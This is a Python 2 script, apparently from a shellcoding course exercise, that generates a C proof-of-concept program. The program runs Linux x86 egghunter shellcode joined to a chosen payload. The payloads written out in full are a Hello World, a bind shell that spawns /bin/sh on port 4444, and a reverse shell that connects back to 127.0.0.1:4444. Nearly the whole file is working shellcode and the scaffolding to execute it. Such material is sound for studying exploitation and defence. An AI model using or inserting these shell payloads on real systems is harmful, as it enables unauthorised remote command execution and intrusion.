#!/usr/bin/python

# Filename: wrapper.py
# Author: David Alvarez Robles (km0xu95)
# Website: https://blog.asturhackers.es

# Purpose: This script was developed in order to dynamically change the payload
# used in the EggHunter shellcode

import sys
import re

if(len(sys.argv) != 2):
	print "Usage: ./wrapper.py <HelloWorld/Bind/Reverse>"
	sys.exit(0)

elif(not(sys.argv[1].startswith("HelloWorld") or sys.argv[1].startswith("Bind") or sys.argv[1].startswith("Reverse"))):
	print "[-] Payload must be HelloWorldBind or Reverse"
	sys.exit(0)

else:
	print "[*] Selected payload: " + sys.argv[1]
	egghunter = "\\x31\\xd2\\x66\\x81\\xca\\xff\\x0f\\x42\\x8d\\x5a\\x04\\x6a\\x21\\x58\\xcd\\x80\\x3c\\xf2\\x74\\xee\\xb8\\x90\\x50\\x90\\x50\\x89\\xd7\\xaf\\x75\\xe9\\xaf\\x75\\xe6\\xff\\xe7"
	egg = "\\x90\\x50\\x90\\x50"*2
	helloworld = "\\xeb\\x17\\x31\\xc0\\xb0\\x04\\x31\\xdb\\xb3\\x01\\x59\\x31\\xd2\\xb2\\x0d\\xcd\\x80\\x31\\xc0\\xb0\\x01\\x31\\xdb\\xcd\\x80\\xe8\\xe4\\xff\\xff\\xff\\x48\\x65\\x6c\\x6c\\x6f\\x20\\x57\\x6f\\x72\\x6c\\x64\\x21\\x0a"
	bind = "\\x31\\xc0\\x89\\xc3\\x50\\x6a\\x01\\x6a\\x02\\xb0\\x66\\x43\\x89\\xe1\\xcd\\x80\\x89\\xc2\\x31\\xf6\\x56\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x89\\xe6\\x6a\\x16\\x56\\x52\\xb0\\x66\\x43\\x89\\xe1\\xcd\\x80\\x6a\\x01\\x52\\xb0\\x66\\x83\\xc3\\x02\\x89\\xe1\\xcd\\x80\\x31\\xff\\x57\\x57\\x52\\xb0\\x66\\x83\\xc3\\x01\\x89\\xe1\\xcd\\x80\\x89\\xc2\\x89\\xd3\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80"
	reverse = "\\x31\\xc0\\x89\\xc3\\x50\\x6a\\x01\\x6a\\x02\\xb0\\x66\\x43\\x89\\xe1\\xcd\\x80\\x89\\xc2\\x31\\xf6\\x68\\x7f\\x00\\x00\\x01\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x89\\xe6\\x6a\\x16\\x56\\x52\\xb0\\x66\\x83\\xc3\\x02\\x89\\xe1\\xcd\\x80\\x89\\xd3\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80"

	print "[+] Code for C proof-of-concept:\n"

	print "#include<stdlib.h>"
	print "#include<stdio.h>"
	print "#include<string.h>"
	print ""
	print "unsigned char egghunter[] = \"" + egghunter + "\";"
	print ""
	if sys.argv[1].startswith("HelloWorld"):
		print "unsigned char code[] = \"" + egg + helloworld + "\";"
	elif sys.argv[1].startswith("Bind"):
		print "unsigned char code[] = \"" + egg + bind + "\";"
	else:
		print "unsigned char code[] = \"" + egg + reverse + "\";"
	print ""
	print "main()"
	print "{"
	print "\tchar *buffer;"
	print "\tbuffer = malloc(strlen(code));"
	print "\tmemcpy(buffer, code, strlen(code));"
	print ""
	print "\tprintf(\"EggHunter routine length: %d\\n\", strlen(egghunter));"
	print "\tprintf(\"Shellcode length: %d\\n\", strlen(code));"
	print ""
	print "\tint (*ret) () = (int(*)())egghunter;"
	print ""
	print "\tret();"
	print ""
	print "\tfree(buffer);"
	print "}"
